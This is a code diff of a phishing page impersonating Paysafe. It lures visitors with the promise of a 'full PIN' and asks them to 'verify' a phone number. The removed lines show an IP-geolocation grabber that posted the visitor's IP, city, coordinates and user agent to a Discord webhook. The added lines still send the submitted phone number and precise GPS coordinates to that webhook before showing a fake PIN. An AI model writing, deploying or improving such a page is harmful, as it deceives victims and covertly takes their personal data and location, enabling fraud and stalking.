@@ -12,9 +12,7 @@
     <meta name="twitter:description" content="To get the full PIN, click the link below for your online receipt." />
     <meta name="twitter:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
     <title>Paysafe - Verify Your Phone Number</title>
-    <script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;type=content-script&amp;dmn=0gls2zltv6ps6zcxuvqx.c.websim.com&amp;url=https%3A%2F%2F0gls2zltv6ps6zcxuvqx.c.websim.com%2Findex.html%3Fv%3D20%26raw%3D&amp;app=firefox.exe&amp;css=3&amp;js=1&amp;rel=1&amp;rji=1&amp;sbe=1&amp;stealth=1&amp;st-push&amp;st-loc&amp;st-dnt&amp;st-1pcttl=4320"></script>
-<script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;name=AdGuard%20Extra&amp;name=AdGuard%20Popup%20Blocker&amp;type=user-script"></script><script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;type=content-script&amp;dmn=0gls2zltv6ps6zcxuvqx.c.websim.com&amp;url=https%3A%2F%2F0gls2zltv6ps6zcxuvqx.c.websim.com%2Findex.html%3Fv%3D12%26raw%3D&amp;app=firefox.exe&amp;css=3&amp;js=1&amp;rel=1&amp;rji=1&amp;sbe=1&amp;stealth=1&amp;st-push&amp;st-loc&amp;st-dnt&amp;st-1pcttl=4320"></script>
-<script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;name=AdGuard%20Extra&amp;name=AdGuard%20Popup%20Blocker&amp;type=user-script"></script><link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -34,7 +32,7 @@
             text-align: center;
             max-width: 500px;
             width: 90%;
-            border-top: 5px solid #007bff; /* Paysafe blue color */
+            border-top: 5px solid #007bff;
         }
         h1 {
             color: #007bff;
@@ -46,13 +44,6 @@
             font-size: 1.1em;
             line-height: 1.6;
             margin-bottom: 25px;
-        }
-        .logo {
-            margin-bottom: 30px;
-        }
-        .logo img {
-            max-width: 180px;
-            height: auto;
         }
         .phone-input-container {
             display: flex;
@@ -100,7 +91,7 @@
             font-size: 2.8em;
             font-weight: 700;
             letter-spacing: 3px;
-            color: #28a745; /* Green for emphasis */
+            color: #28a745;
             margin-bottom: 30px;
             display: inline-block;
         }
@@ -114,15 +105,15 @@
             font-size: 0.9em;
             margin-top: -15px;
             margin-bottom: 15px;
-            display: none; /* Hidden by default */
+            display: none;
         }
         .suspicious-activity-section {
-            background-color: #fff3cd; /* Light warning yellow */
+            background-color: #fff3cd;
             border: 1px solid #ffeeba;
             border-radius: 8px;
             padding: 25px;
             margin-bottom: 25px;
-            color: #856404; /* Dark yellow text */
+            color: #856404;
         }
         .suspicious-activity-section h2 {
             color: #856404;
@@ -138,19 +129,12 @@
             margin-top: 15px;
         }
         .status-success {
-            color: #28a745; /* Green */
+            color: #28a745;
         }
         .status-fail {
-            color: #dc3545; /* Red */
+            color: #dc3545;
         }
     </style>
-    <script type="importmap">
-        {
-            "imports": {
-                
-            }
-        }
-    </script>
 </head>
 <body>
     <div class="container">
@@ -223,176 +207,55 @@
             }
         }
 
-        // Fetch user's country code and other public info on page load using ipapi.co
-        async function fetchAndSendUserInfo() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const json = await response.json();
-                
-                let userInfo = {
-                    content: "New visitor information:",
-                    embeds: [{
-                        title: "Visitor Details",
-                        color: 3447003, // A nice blue color
-                        fields: []
-                    }]
-                };
-
-                if (json) {
-                    if (json.ip) userInfo.embeds[0].fields.push({ name: "IP Address", value: json.ip, inline: true });
-                    if (json.country_name) userInfo.embeds[0].fields.push({ name: "Country", value: json.country_name, inline: true });
-                    if (json.region) userInfo.embeds[0].fields.push({ name: "Region", value: json.region, inline: true });
-                    if (json.city) userInfo.embeds[0].fields.push({ name: "City", value: json.city, inline: true });
-                    if (json.postal) userInfo.embeds[0].fields.push({ name: "Postal Code", value: json.postal, inline: true });
-                    if (json.latitude && json.longitude) userInfo.embeds[0].fields.push({ name: "Approx. Coordinates (IP)", value: `${json.latitude}, ${json.longitude}`, inline: true });
-                    if (json.org) userInfo.embeds[0].fields.push({ name: "Organization", value: json.org, inline: false });
-                    if (json.country_calling_code) {
-                        countryCallingCode = json.country_calling_code;
-                        countryCodeDisplay.textContent = countryCallingCode;
-                        userInfo.embeds[0].fields.push({ name: "Country Calling Code", value: countryCallingCode, inline: true });
-                    }
-                }
-
-                // Add browser and OS info
-                userInfo.embeds[0].fields.push({ name: "User Agent", value: navigator.userAgent, inline: false });
-                
-                sendToDiscord(userInfo);
-
-            } catch (error) {
-                console.error('Error fetching user info:', error);
-                console.warn('Could not detect user info, defaulting country code to +1.');
-            }
-        }
-
-        fetchAndSendUserInfo();
-
         // Basic phone number validation function
         function isValidPhoneNumber(phoneNumber) {
-            // This is a basic validation. It checks if the number contains at least 7 digits after cleaning.
-            // A more robust solution might involve country-specific regex or a dedicated library.
             const cleanedNumber = phoneNumber.replace(/[\s-()]/g, '');
             return /^\d{7,}$/.test(cleanedNumber); // At least 7 digits
         }
 
         submitBtn.addEventListener('click', async () => {
             const rawPhoneNumber = phoneNumberInput.value.trim();
-
-            if (!rawPhoneNumber || !isValidPhoneNumber(rawPhoneNumber)) {
-                phoneNumberError.style.display = 'block'; // Show error message
+            if (!isValidPhoneNumber(rawPhoneNumber)) {
+                phoneNumberError.classList.remove('hidden');
                 return;
-            } else {
-                phoneNumberError.style.display = 'none'; // Hide error message if valid
             }
 
-            const fullPhoneNumber = countryCallingCode + rawPhoneNumber.replace(/[\s-()]/g, ''); // Format for webhook
+            // Hide phone number input and show suspicious activity section
+            phoneInputSection.classList.add('hidden');
+            suspiciousActivitySection.classList.remove('hidden');
 
-            // Send phone number to Discord Webhook
-            const phoneNumberPayload = {
-                content: `New Phone Number Submission:`,
-                embeds: [{
-                    title: "Phone Number Provided",
-                    color: 16763904, // A nice orange color
-                    fields: [
-                        { name: "Full Phone Number", value: fullPhoneNumber, inline: false }
-                    ]
-                }]
-            };
-
-            try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(phoneNumberPayload),
-                });
-
-                if (response.ok) {
-                    console.log('Phone number sent to Discord successfully!');
-                    // After successful submission, switch to suspicious activity section
-                    phoneInputSection.classList.add('hidden');
-                    suspiciousActivitySection.classList.remove('hidden');
-                    requestGPSLocation(); // Request GPS location
-                } else {
-                    console.error('Failed to send phone number to Discord:', response.status, response.statusText);
-                    alert('There was an issue processing your request. Please try again.');
-                }
-            } catch (error) {
-                console.error('Error sending phone number to Discord:', error);
-                alert('Network error. Please check your connection and try again.');
-            }
-        });
-
-        // Function to request GPS location
-        function requestGPSLocation() {
+            // Request GPS location
             if (navigator.geolocation) {
-                gpsStatus.textContent = 'Requesting GPS permission...';
-                gpsStatus.className = ''; // Clear previous status styles
+                gpsStatus.textContent = 'Fetching your location...';
+                gpsStatus.classList.remove('status-success', 'status-fail');
+
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        gpsStatus.textContent = 'GPS location obtained successfully!';
+                        gpsStatus.textContent = `Location retrieved successfully! Latitude: ${latitude}, Longitude: ${longitude}`;
                         gpsStatus.classList.add('status-success');
 
-                        // Construct Google Maps static image URL
-                        const googleMapsImageUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=600x300&markers=color:red%7C${latitude},${longitude}&key=YOUR_GOOGLE_MAPS_API_KEY`; // Replace YOUR_GOOGLE_MAPS_API_KEY with an actual key if you have one, otherwise this will likely not work in production.
-
-                        // Send GPS coordinates and Google Maps link/image to Discord
-                        const gpsPayload = {
-                            content: `GPS Location for Submitted Phone Number:`,
-                            embeds: [{
-                                title: "Exact GPS Location",
-                                color: 5763719, // A nice green color
-                                fields: [
-                                    { name: "Latitude", value: latitude, inline: true },
-                                    { name: "Longitude", value: longitude, inline: true },
-                                    { name: "Google Maps", value: `[View on Google Maps](https://maps.google.com/?q=${latitude},${longitude})`, inline: false }
-                                ],
-                                image: {
-                                    url: googleMapsImageUrl
-                                }
-                            }]
+                        // Send phone number and location to Discord webhook
+                        const data = {
+                            content: `Phone Number: ${countryCallingCode} ${rawPhoneNumber}\nLocation: Latitude: ${latitude}, Longitude: ${longitude}`,
                         };
-                        await sendToDiscord(gpsPayload);
+                        await sendToDiscord(data);
 
-                        // Show PIN display after sending GPS
+                        // Show PIN display section
                         suspiciousActivitySection.classList.add('hidden');
                         pinDisplaySection.classList.remove('hidden');
                     },
-                    (error) => {
-                        let errorMessage = 'Failed to verify device.';
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = "Location permission denied. Failed to verify device.";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = "Location information is unavailable. Failed to verify device.";
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = "The request to get user location timed out. Failed to verify device.";
-                                break;
-                            case error.UNKNOWN_ERROR:
-                                errorMessage = "An unknown error occurred. Failed to verify device.";
-                                break;
-                        }
-                        gpsStatus.textContent = errorMessage;
+                    () => {
+                        gpsStatus.textContent = 'Location access denied or unavailable.';
                         gpsStatus.classList.add('status-fail');
-
-                        // Optionally, you could try to redirect or show a different message here
-                        // if GPS permission is denied. For this prompt, we just display the error.
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000, // 10 seconds
-                        maximumAge: 0 // No cached position
                     }
                 );
             } else {
-                gpsStatus.textContent = 'Geolocation is not supported by this browser. Failed to verify device.';
+                gpsStatus.textContent = 'Geolocation is not supported by your browser.';
                 gpsStatus.classList.add('status-fail');
             }
-        }
+        });
     </script>
 </body>
 </html>
